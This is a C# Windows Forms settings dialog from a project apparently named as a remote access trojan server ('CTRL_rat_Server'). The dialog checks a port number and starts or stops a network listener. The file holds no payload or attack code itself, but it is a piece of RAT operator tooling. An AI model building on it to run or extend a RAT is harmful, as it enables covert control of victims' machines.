using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CTRL_rat_Server.forms
{
    public partial class settings : Form
    {
        public Main main;
        public settings(Main _main)
        {
            main = _main;
            InitializeComponent();
            if (main.listen.listener != null)
            {
                if (main.listen.listening)
                {
                    button1.Enabled = false;
                }
                else
                {
                    button2.Enabled = false;
                }
            }
            else
            {
                button2.Enabled = false;

            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        public bool Checkport(string port)
        {
            try 
            {
                int intport = int.Parse(port);
                return true;
            }
            catch
            {
                return false;
            
            }
        }
        private void button1_Click(object sender, EventArgs e)//listen
        {
            if (!Checkport(textBox2.Text)) { MessageBox.Show("invalid port"); return; }
            new Thread(() => main.listen.StartListening(int.Parse(textBox2.Text))).Start();
            button2.Enabled = true;
            button1.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            new Thread(() => main.listen.StopListening()).Start();
            button2.Enabled = false;
            button1.Enabled = true;
        }
    }
}
